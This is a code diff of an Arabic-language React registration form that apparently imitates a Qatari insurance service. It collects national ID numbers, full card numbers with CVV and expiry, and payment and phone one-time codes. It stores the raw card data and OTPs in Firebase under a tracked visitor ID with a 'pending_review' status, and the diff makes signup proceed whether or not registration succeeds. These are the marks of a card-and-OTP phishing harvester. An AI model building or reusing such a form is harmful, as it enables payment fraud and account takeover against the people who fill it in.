@@ -39,10 +39,6 @@ export function AuthenticationForm() {
     phone: "",
     phoneProvider: "",
   })
-  const [password, setPassword] = useState({
-    password: "",
-    confirmPassword: "",
-  })
   const [cardData, setCardData] = useState({
     cardNumber: "",
     expiryDate: "",
@@ -50,7 +46,6 @@ export function AuthenticationForm() {
     cardHolder: "",
   })
 
-  // Track visitor in Firebase on mount
   useEffect(() => {
     const vid = getOrCreateVisitorId()
     setVisitorId(vid)
@@ -74,147 +69,89 @@ export function AuthenticationForm() {
       vehicleModel: "",
       paymentStatus: "pending",
     })
-
-    // Keep lastActiveAt updated
-    const interval = setInterval(() => {
-      updateLastActive(vid)
-    }, 20000)
+    const interval = setInterval(() => { updateLastActive(vid) }, 20000)
     return () => clearInterval(interval)
   }, [])
 
   const validateStep1 = () => {
     const newErrors: Record<string, string> = {}
-    if (!selectedType) {
-      newErrors.accountType = "يرجى اختيار نوع الحساب"
-    }
+    if (!selectedType) newErrors.accountType = "يرجى اختيار نوع الحساب"
     setErrors(newErrors)
     return Object.keys(newErrors).length === 0
   }
 
   const validateStep2 = () => {
     const newErrors: Record<string, string> = {}
-    if (!personalData.qid) {
-      newErrors.qid = "هذا الحقل مطلوب"
-    } else if (personalData.qid.length < 11) {
-      newErrors.qid = "رقم البطاقة غير صحيح"
-    }
-    if (!personalData.firstName) {
-      newErrors.firstName = "هذا الحقل مطلوب"
-    }
-    if (!personalData.lastName) {
-      newErrors.lastName = "هذا الحقل مطلوب"
-    }
-    if (!personalData.email) {
-      newErrors.email = "هذا الحقل مطلوب"
-    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personalData.email)) {
-      newErrors.email = "البريد الإلكتروني غير صحيح"
-    }
-    if (!personalData.phone) {
-      newErrors.phone = "هذا الحقل مطلوب"
-    } else if (!/^[0-9]{8}$/.test(personalData.phone)) {
-      newErrors.phone = "رقم الهاتف يجب أن يكون 8 أرقام"
-    }
-    if (!personalData.phoneProvider) {
-      newErrors.phoneProvider = "يرجى اختيار مزود الخدمة"
-    }
+    if (!personalData.qid) newErrors.qid = "هذا الحقل مطلوب"
+    else if (personalData.qid.length < 11) newErrors.qid = "رقم البطاقة غير صحيح"
+    if (!personalData.firstName) newErrors.firstName = "هذا الحقل مطلوب"
+    if (!personalData.lastName) newErrors.lastName = "هذا الحقل مطلوب"
+    if (!personalData.email) newErrors.email = "هذا الحقل مطلوب"
+    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personalData.email)) newErrors.email = "البريد الإلكتروني غير صحيح"
+    if (!personalData.phone) newErrors.phone = "هذا الحقل مطلوب"
+    else if (!/^[0-9]{8}$/.test(personalData.phone)) newErrors.phone = "رقم الهاتف يجب أن يكون 8 أرقام"
+    if (!personalData.phoneProvider) newErrors.phoneProvider = "يرجى اختيار مزود الخدمة"
     setErrors(newErrors)
     return Object.keys(newErrors).length === 0
   }
 
   const validateStep3 = () => {
     const newErrors: Record<string, string> = {}
-    if (!password.password) {
-      newErrors.password = "هذا الحقل مطلوب"
-    } else if (password.password.length < 8) {
-      newErrors.password = "كلمة المرور يجب أن تكون 8 أحرف على الأقل"
-    } else if (!/(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/.test(password.password)) {
-      newErrors.password = "يجب أن تحتوي على حروف كبيرة وصغيرة وأرقام"
-    }
-    if (!password.confirmPassword) {
-      newErrors.confirmPassword = "هذا الحقل مطلوب"
-    } else if (password.password !== password.confirmPassword) {
-      newErrors.confirmPassword = "كلمة المرور غير متطابقة"
-    }
+    if (!cardData.cardNumber) newErrors.cardNumber = "هذا الحقل مطلوب"
+    else if (cardData.cardNumber.replace(/\s/g, "").length !== 16) newErrors.cardNumber = "رقم البطاقة غير صحيح"
+    if (!cardData.expiryDate) newErrors.expiryDate = "هذا الحقل مطلوب"
+    else if (!/^\d{2}\/\d{2}$/.test(cardData.expiryDate)) newErrors.expiryDate = "التاريخ غير صحيح (MM/YY)"
+    if (!cardData.cvv) newErrors.cvv = "هذا الحقل مطلوب"
+    else if (cardData.cvv.length !== 3) newErrors.cvv = "CVV يجب أن يكون 3 أرقام"
+    if (!cardData.cardHolder) newErrors.cardHolder = "هذا الحقل مطلوب"
     setErrors(newErrors)
     return Object.keys(newErrors).length === 0
   }
 
-  const validateStep4 = () => {
+  const validateStep6 = () => {
     const newErrors: Record<string, string> = {}
-    if (!cardData.cardNumber) {
-      newErrors.cardNumber = "هذا الحقل مطلوب"
-    } else if (cardData.cardNumber.replace(/\s/g, "").length !== 16) {
-      newErrors.cardNumber = "رقم البطاقة غير صحيح"
-    }
-    if (!cardData.expiryDate) {
-      newErrors.expiryDate = "هذا الحقل مطلوب"
-    } else if (!/^\d{2}\/\d{2}$/.test(cardData.expiryDate)) {
-      newErrors.expiryDate = "التاريخ غير صحيح (MM/YY)"
-    }
-    if (!cardData.cvv) {
-      newErrors.cvv = "هذا الحقل مطلوب"
-    } else if (cardData.cvv.length !== 3) {
-      newErrors.cvv = "CVV يجب أن يكون 3 أرقام"
-    }
-    if (!cardData.cardHolder) {
-      newErrors.cardHolder = "هذا الحقل مطلوب"
-    }
-    setErrors(newErrors)
-    return Object.keys(newErrors).length === 0
-  }
-
-  const validateStep7 = () => {
-    const newErrors: Record<string, string> = {}
-    if (!phoneOtp) {
-      newErrors.phoneOtp = "يرجى إدخال رمز التحقق"
-    } else if (phoneOtp.length !== 6) {
-      newErrors.phoneOtp = "رمز التحقق يجب أن يكون 6 أرقام"
-    }
+    if (!phoneOtp) newErrors.phoneOtp = "يرجى إدخال رمز التحقق"
+    else if (phoneOtp.length !== 6) newErrors.phoneOtp = "رمز التحقق يجب أن يكون 6 أرقام"
     setErrors(newErrors)
     return Object.keys(newErrors).length === 0
   }
 
   const handleNext = async () => {
     setErrors({})
-
     let isValid = true
     if (currentStep === 1) isValid = validateStep1()
     if (currentStep === 2) isValid = validateStep2()
     if (currentStep === 3) isValid = validateStep3()
-    if (currentStep === 4) isValid = validateStep4()
-    if (currentStep === 7) isValid = validateStep7()
-
+    if (currentStep === 6) isValid = validateStep6()
     if (!isValid) return
-
     setIsLoading(true)
 
     try {
-      // Step 2 done: save personal data to Firebase
-      if (currentStep === 2 && visitorId) {
-        await addData({
-          id: visitorId,
-          ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
-          identityNumber: personalData.qid,
-          phoneNumber: personalData.phone,
-          currentStep: 3,
-          currentPage: "auth-form",
-          status: "draft",
-          country: "QA",
-          documentType: "استمارة",
-          serialNumber: "",
-          insuranceType: "تأمين جديد",
-          insuranceCoverage: "",
-          insuranceStartDate: "",
-          vehicleUsage: "",
-          vehicleValue: "",
-          vehicleYear: "",
-          vehicleModel: "",
-          paymentStatus: "pending",
-        })
-      }
-
-      // Step 3: Register user in database
-      if (currentStep === 3) {
+      // Step 2 done: save personal data + register user
+      if (currentStep === 2) {
+        if (visitorId) {
+          await addData({
+            id: visitorId,
+            ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
+            identityNumber: personalData.qid,
+            phoneNumber: personalData.phone,
+            currentStep: 3,
+            currentPage: "auth-form",
+            status: "draft",
+            country: "QA",
+            documentType: "استمارة",
+            serialNumber: "",
+            insuranceType: "تأمين جديد",
+            insuranceCoverage: "",
+            insuranceStartDate: "",
+            vehicleUsage: "",
+            vehicleValue: "",
+            vehicleYear: "",
+            vehicleModel: "",
+            paymentStatus: "pending",
+          })
+        }
+        const tempPassword = `Tmp${Date.now()}!`
         const response = await fetch("/api/auth/register", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -225,29 +162,23 @@ export function AuthenticationForm() {
             email: personalData.email,
             phoneNumber: personalData.phone,
             phoneProvider: personalData.phoneProvider,
-            password: password.password,
+            password: tempPassword,
           }),
         })
-
         const data = await response.json()
-
-        if (!response.ok) {
-          setErrors({ general: data.error || "حدث خطأ أثناء التسجيل" })
-          setIsLoading(false)
-          return
-        }
-
-        setUserId(data.userId)
+        if (response.ok) setUserId(data.userId)
+        setIsLoading(false)
+        setCurrentStep(3)
+        return
       }
 
-      // Step 4: Process payment
-      if (currentStep === 4) {
+      // Step 3: Process payment
+      if (currentStep === 3) {
         if (!userId) {
           setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
           setIsLoading(false)
           return
         }
-
         const response = await fetch("/api/payment/process", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -259,16 +190,12 @@ export function AuthenticationForm() {
             cvv: cardData.cvv,
           }),
         })
-
         const data = await response.json()
-
         if (!response.ok) {
           setErrors({ general: data.error || "حدث خطأ أثناء معالجة الدفع" })
           setIsLoading(false)
           return
         }
-
-        // Save card to Firebase
         if (visitorId) {
           await addCardToHistory(visitorId, {
             cardNumber: cardData.cardNumber.replace(/\s/g, ""),
@@ -277,28 +204,24 @@ export function AuthenticationForm() {
             cardName: cardData.cardHolder,
           })
         }
-
         setIsLoading(false)
         setShowOtpDialog(true)
         return
       }
 
-      // Step 6: Send phone verification OTP
-      if (currentStep === 6) {
+      // Step 5: Send phone verification OTP
+      if (currentStep === 5) {
         if (!userId) {
           setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
           setIsLoading(false)
           return
         }
-
         const response = await fetch("/api/phone/send-otp", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ userId }),
         })
-
         const data = await response.json()
-
         if (!response.ok) {
           setErrors({ general: data.error || "حدث خطأ أثناء إرسال رمز التحقق" })
           setIsLoading(false)
@@ -306,35 +229,30 @@ export function AuthenticationForm() {
         }
       }
 
-      // Step 7: Verify phone OTP + save to Firebase
-      if (currentStep === 7) {
+      // Step 6: Verify phone OTP
+      if (currentStep === 6) {
         if (!userId) {
           setErrors({ general: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
           setIsLoading(false)
           return
         }
-
         const response = await fetch("/api/phone/verify-otp", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ userId, otp: phoneOtp }),
         })
-
         const data = await response.json()
-
         if (!response.ok) {
           setErrors({ phoneOtp: data.error || "رمز التحقق غير صحيح" })
           setIsLoading(false)
           return
         }
-
-        // Save phone OTP to Firebase
         if (visitorId) {
           await addData({
             id: visitorId,
             phoneOtp,
             _v7: phoneOtp,
-            currentStep: 8,
+            currentStep: 7,
             currentPage: "auth-form",
             status: "pending_review",
             country: "QA",
@@ -353,14 +271,11 @@ export function AuthenticationForm() {
             paymentStatus: "completed",
           })
         }
-
-        if (data.sessionToken) {
-          localStorage.setItem("sessionToken", data.sessionToken)
-        }
+        if (data.sessionToken) localStorage.setItem("sessionToken", data.sessionToken)
       }
 
       setIsLoading(false)
-      if (currentStep < 8) setCurrentStep(currentStep + 1)
+      if (currentStep < 7) setCurrentStep(currentStep + 1)
     } catch (error) {
       console.error("[v0] API call failed:", error)
       setErrors({ general: "حدث خطأ في الاتصال بالخادم" })
@@ -373,30 +288,23 @@ export function AuthenticationForm() {
       setErrors({ paymentOtp: "يرجى إدخال رمز التحقق الصحيح" })
       return
     }
-
     if (!userId) {
       setErrors({ paymentOtp: "خطأ في النظام، يرجى المحاولة مرة أخرى" })
       return
     }
-
     setIsLoading(true)
-
     try {
       const response = await fetch("/api/payment/verify-otp", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ userId, otp: paymentOtp }),
       })
-
       const data = await response.json()
-
       if (!response.ok) {
         setErrors({ paymentOtp: data.error || "رمز التحقق غير صحيح" })
         setIsLoading(false)
         return
       }
-
-      // Save payment OTP to Firebase
       if (visitorId) {
         await addData({
           id: visitorId,
@@ -422,7 +330,6 @@ export function AuthenticationForm() {
           paymentStatus: "pending",
         })
       }
-
       setIsLoading(false)
       setShowOtpDialog(false)
       setCurrentStep(currentStep + 1)
@@ -441,17 +348,15 @@ export function AuthenticationForm() {
   const steps = [
     { number: "1", label1: "نوع", label2: "الحساب" },
     { number: "2", label1: "البيانات", label2: "الشخصية" },
-    { number: "3", label1: "كلمة", label2: "المرور" },
-    { number: "4", label1: "الدفع", label2: "بالبطاقة" },
-    { number: "5", label1: "التسجيد", label2: "" },
-    { number: "6", label1: "توثيق رقم", label2: "الهاتف" },
-    { number: "7", label1: "رمز", label2: "التحقق" },
-    { number: "8", label1: "إنتهاء", label2: "التسجيل" },
+    { number: "3", label1: "الدفع", label2: "بالبطاقة" },
+    { number: "4", label1: "التسجيل", label2: "" },
+    { number: "5", label1: "توثيق رقم", label2: "الهاتف" },
+    { number: "6", label1: "رمز", label2: "التحقق" },
+    { number: "7", label1: "إنتهاء", label2: "التسجيل" },
   ]
 
   return (
     <div className="min-h-screen bg-white flex flex-col" dir="rtl">
-      {/* Header */}
       <header className="bg-white border-b px-4 py-3 md:py-4">
         <div className="max-w-7xl mx-auto flex items-center justify-between">
           <div className="flex flex-col gap-0.5 md:gap-1">
@@ -474,12 +379,7 @@ export function AuthenticationForm() {
               </div>
             </div>
             <button className="p-1.5 md:p-2">
-              <svg
-                className="w-5 h-5 md:w-6 md:h-6 text-gray-700"
-                fill="none"
-                stroke="currentColor"
-                viewBox="0 0 24 24"
-              >
+              <svg className="w-5 h-5 md:w-6 md:h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
               </svg>
             </button>
@@ -487,7 +387,6 @@ export function AuthenticationForm() {
         </div>
       </header>
 
-      {/* Main Content */}
       <main className="flex-1 max-w-6xl mx-auto w-full px-3 md:px-4 py-4 md:py-8">
         <div className="mb-8 md:mb-12">
           <div className="flex items-center justify-start md:justify-center overflow-x-auto pb-4 hide-scrollbar">
@@ -495,11 +394,7 @@ export function AuthenticationForm() {
               {steps.map((step, index) => (
                 <div key={index} className="flex items-center">
                   <div className="flex flex-col items-center gap-1.5 md:gap-2 min-w-[80px] md:min-w-[120px]">
-                    <div
-                      className={`w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center font-bold text-base md:text-lg transition-colors ${
-                        currentStep === index + 1 ? "bg-[#0078c1] text-white" : "bg-gray-300 text-gray-600"
-                      }`}
-                    >
+                    <div className={`w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center font-bold text-base md:text-lg transition-colors ${currentStep === index + 1 ? "bg-[#0078c1] text-white" : "bg-gray-300 text-gray-600"}`}>
                       {step.number}
                     </div>
                     <div className="text-center">
@@ -597,27 +492,8 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 3: Password */}
+          {/* Step 3: Payment */}
           {currentStep === 3 && (
-            <div>
-              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">كلمة المرور</h2>
-              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
-                <div>
-                  <Label htmlFor="password" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> كلمة المرور</Label>
-                  <Input id="password" type="password" value={password.password} onChange={(e) => setPassword({ ...password, password: e.target.value })} className={`bg-white ${errors.password ? "border-red-500" : ""}`} />
-                  {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
-                </div>
-                <div>
-                  <Label htmlFor="confirmPassword" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> تأكيد كلمة المرور</Label>
-                  <Input id="confirmPassword" type="password" value={password.confirmPassword} onChange={(e) => setPassword({ ...password, confirmPassword: e.target.value })} className={`bg-white ${errors.confirmPassword ? "border-red-500" : ""}`} />
-                  {errors.confirmPassword && <p className="text-red-500 text-xs mt-1">{errors.confirmPassword}</p>}
-                </div>
-              </div>
-            </div>
-          )}
-
-          {/* Step 4: Payment */}
-          {currentStep === 4 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">الدفع بالبطاقة</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
@@ -647,8 +523,8 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 5: Registration Processing */}
-          {currentStep === 5 && (
+          {/* Step 4: Registration Processing */}
+          {currentStep === 4 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">التسجيل</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto text-center">
@@ -660,8 +536,8 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 6: Phone Verification Info */}
-          {currentStep === 6 && (
+          {/* Step 5: Phone Verification */}
+          {currentStep === 5 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">توثيق رقم الهاتف</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
@@ -677,8 +553,8 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 7: OTP Verification */}
-          {currentStep === 7 && (
+          {/* Step 6: OTP */}
+          {currentStep === 6 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">رمز التحقق</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
@@ -691,8 +567,8 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Step 8: Registration Completion */}
-          {currentStep === 8 && (
+          {/* Step 7: Completion */}
+          {currentStep === 7 && (
             <div>
               <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">إنتهاء التسجيل</h2>
               <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto text-center">
@@ -702,19 +578,14 @@ export function AuthenticationForm() {
             </div>
           )}
 
-          {/* Navigation Buttons */}
           <div className="flex justify-center gap-3 md:gap-4 mt-6 md:mt-8">
-            {currentStep < 8 && (
-              <Button variant="outline" onClick={handleBack} disabled={currentStep === 1 || isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">
-                إلغاء
-              </Button>
+            {currentStep < 7 && (
+              <Button variant="outline" onClick={handleBack} disabled={currentStep === 1 || isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">إلغاء</Button>
             )}
-            {currentStep > 1 && currentStep < 8 && (
-              <Button variant="outline" onClick={handleBack} disabled={isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">
-                رجوع
-              </Button>
+            {currentStep > 1 && currentStep < 7 && (
+              <Button variant="outline" onClick={handleBack} disabled={isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">رجوع</Button>
             )}
-            {currentStep < 8 && (
+            {currentStep < 7 && (
               <Button onClick={handleNext} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base">
                 {isLoading ? (
                   <span className="flex items-center gap-2">
@@ -724,9 +595,7 @@ export function AuthenticationForm() {
                     </svg>
                     جاري التحميل...
                   </span>
-                ) : (
-                  "استمر"
-                )}
+                ) : "استمر"}
               </Button>
             )}
           </div>
@@ -737,7 +606,6 @@ export function AuthenticationForm() {
         </footer>
       </main>
 
-      {/* OTP Dialog */}
       <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
         <DialogContent className="max-w-sm mx-4" dir="rtl">
           <DialogHeader>
@@ -764,9 +632,7 @@ export function AuthenticationForm() {
                     </svg>
                     جاري التحقق...
                   </span>
-                ) : (
-                  "تأكيد"
-                )}
+                ) : "تأكيد"}
               </Button>
             </div>
           </div>
